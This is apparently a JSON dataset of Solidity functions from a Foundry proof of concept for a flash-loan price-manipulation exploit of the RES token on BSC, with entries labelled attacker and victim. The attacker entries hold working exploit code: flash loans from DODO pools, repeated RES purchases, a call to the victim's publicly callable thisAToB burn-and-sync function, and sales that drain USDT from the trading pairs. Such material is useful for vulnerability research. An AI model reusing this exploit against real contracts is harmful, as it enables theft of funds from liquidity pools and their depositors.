[
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "DPPFlashLoanCall",
    "original_code": "    function DPPFlashLoanCall(\n        address, /*sender*/\n        uint256, /*baseAmount*/\n        uint256, /*quoteAmount*/\n        bytes calldata /*data*/\n    ) public {\n        if (msg.sender == dodo2) {\n            DVM(dodo).flashLoan(0, amount, address(this), new bytes(1));\n            USDT_TOKEN.balanceOf(address(this));\n            USDT_TOKEN.transfer(dodo2, amount2);\n        } else {\n            // get RES\n            uint256 amountBuy = USDT_TOKEN.balanceOf(address(this)) / 4;\n            buyRES(amountBuy);\n            buyRES(amountBuy);\n            buyRES(amountBuy);\n            buyRES(amountBuy);\n            // Burn RES in LP\n            RES_TOKEN.thisAToB();\n            // Sell RES , ALL\n            sellRES();\n            sellALL();\n            USDT_TOKEN.balanceOf(address(this));\n            USDT_TOKEN.transfer(address(dodo), amount);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        vm.createSelectFork(\"bsc\", 21_948_016);\n        // Adding labels to improve stack traces' readability\n        vm.label(address(USDT_TOKEN), \"USDT_TOKEN\");\n        vm.label(address(RES_TOKEN), \"RES_TOKEN\");\n        vm.label(address(ALL_TOKEN), \"ALL_TOKEN\");\n        vm.label(address(WBNB_TOKEN), \"WBNB_TOKEN\");\n        vm.label(address(PS_ROUTER), \"PS_ROUTER\");\n        vm.label(address(USDT_RES_PAIR), \"USDT_RES_PAIR\");\n        vm.label(address(USDT_ALL_PAIR), \"USDT_ALL_PAIR\");\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() public payable {\n        emit log_named_decimal_uint(\n            \"[Start] Attacker USDT balance before exploit\", USDT_TOKEN.balanceOf(address(this)), 18\n        );\n        // use mint WBNB to mock flashLoan\n        (bool success,) = address(WBNB_TOKEN).call{value: 30_000 ether}(\"\");\n        require(success, \"Mocked flashloan failed\");\n        _WBNBToUSDT();\n        uint256 USDTBefore = USDT_TOKEN.balanceOf(address(this));\n        emit log_named_decimal_uint(\n            \"[Start] exchange USDT balance before exploit\", USDT_TOKEN.balanceOf(address(this)), 18\n        );\n        amount = USDT_TOKEN.balanceOf(dodo);\n        amount2 = USDT_TOKEN.balanceOf(dodo2);\n        USDT_TOKEN.approve(address(PS_ROUTER), type(uint256).max);\n        RES_TOKEN.approve(address(PS_ROUTER), type(uint256).max);\n        ALL_TOKEN.approve(address(PS_ROUTER), type(uint256).max);\n        bytes memory bytecode = type(ReceiveToken).creationCode;\n        address _add;\n        assembly {\n            _add := create2(0, add(bytecode, 32), mload(bytecode), 0)\n        }\n        add = _add;\n        DVM(dodo2).flashLoan(0, amount2, address(this), new bytes(1));\n\n        uint256 USDTAfter = USDT_TOKEN.balanceOf(address(this));\n\n        emit log_named_decimal_uint(\n            \"[End] USDT_RES_PAIR USDT balance after exploit\", USDT_TOKEN.balanceOf(address(USDT_RES_PAIR)), 18\n        );\n\n        emit log_named_decimal_uint(\n            \"[End] USDT_ALL_PAIR USDT balance after exploit\", USDT_TOKEN.balanceOf(address(USDT_ALL_PAIR)), 18\n        );\n\n        emit log_named_decimal_uint(\"[End] Attacker USDT balance after exploit\", USDTAfter - USDTBefore, 18);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IRES",
    "source_type": "victim_contract",
    "function_name": "allowance",
    "original_code": "    function allowance(address owner, address spender) external view returns (uint256) {\n        return _allowances[owner][spender];\n    }\n    \n      \n",
    "description": ""
  },
  {
    "contract/interface": "IRES",
    "source_type": "victim_contract",
    "function_name": "approve",
    "original_code": "    function approve(address spender, uint value) external returns (bool) {\n        _approve(msg.sender, spender, value);\n        return true;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IRES",
    "source_type": "victim_contract",
    "function_name": "balanceOf",
    "original_code": "    function balanceOf(address account) external view returns (uint256) {\n        return _balances[account];\n    }\n    \n      \n",
    "description": ""
  },
  {
    "contract/interface": "IRES",
    "source_type": "victim_contract",
    "function_name": "decimals",
    "original_code": "    function decimals() external view returns (uint8) {\n        return _decimals;\n    }\n    \n",
    "description": ""
  },
  {
    "contract/interface": "IRES",
    "source_type": "victim_contract",
    "function_name": "deposit",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IRES",
    "source_type": "victim_contract",
    "function_name": "name",
    "original_code": "    function name() external view returns (string memory) {\n        return _name;\n    }\n    \n     \n",
    "description": ""
  },
  {
    "contract/interface": "IRES",
    "source_type": "victim_contract",
    "function_name": "owner",
    "original_code": "  function owner() public view returns (address) {\n    return _owner;\n  }\n\n\n  modifier onlyOwner() {\n    require(_owner == _msgSender(), \"Ownable: caller is not the owner\");\n    _;\n  }\n\n \n",
    "description": ""
  },
  {
    "contract/interface": "IRES",
    "source_type": "victim_contract",
    "function_name": "symbol",
    "original_code": "    function symbol() external view returns (string memory) {\n        return _symbol;\n    }\n    \n      \n",
    "description": ""
  },
  {
    "contract/interface": "IRES",
    "source_type": "victim_contract",
    "function_name": "thisAToB",
    "original_code": "    function thisAToB() external{\n        _thisAToB();\n    }\n    \n    function _thisAToB() internal{\n        if (_balances[address(this)] > _minAToB){\n            uint256 burnNumber = _balances[address(this)];\n            _approve(address(this),_pancakeRouterToken, _balances[address(this)]);\n            IPancakeRouter(_pancakeRouterToken).swapExactTokensForTokensSupportingFeeOnTransferTokens(\n                _balances[address(this)],\n                0,\n                _pathAToB,\n                address(this),\n                block.timestamp);\n            _burn(_swapV2Pair, burnNumber);\n            IPancakePair(_swapV2Pair).sync();\n        }\n    }\n    \n",
    "description": ""
  },
  {
    "contract/interface": "IRES",
    "source_type": "victim_contract",
    "function_name": "totalSupply",
    "original_code": "    function totalSupply() external view returns (uint256) {\n        return _totalSupply;\n    }\n    \n     \n",
    "description": ""
  },
  {
    "contract/interface": "IRES",
    "source_type": "victim_contract",
    "function_name": "transfer",
    "original_code": "    function transfer(address to, uint value) external returns (bool) {\n        _transfer(msg.sender, to, value);\n        return true;\n    }\n\n    function transferFrom(address from, address to, uint value) external returns (bool) {\n        if (allowance[from][msg.sender] != uint(-1)) {\n            allowance[from][msg.sender] = allowance[from][msg.sender].sub(value);\n        }\n        _transfer(from, to, value);\n        return true;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IRES",
    "source_type": "victim_contract",
    "function_name": "transferFrom",
    "original_code": "    function transferFrom(address from, address to, uint value) external returns (bool) {\n        if (allowance[from][msg.sender] != uint(-1)) {\n            allowance[from][msg.sender] = allowance[from][msg.sender].sub(value);\n        }\n        _transfer(from, to, value);\n        return true;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IRES",
    "source_type": "victim_contract",
    "function_name": "withdraw",
    "original_code": "",
    "description": ""
  }
]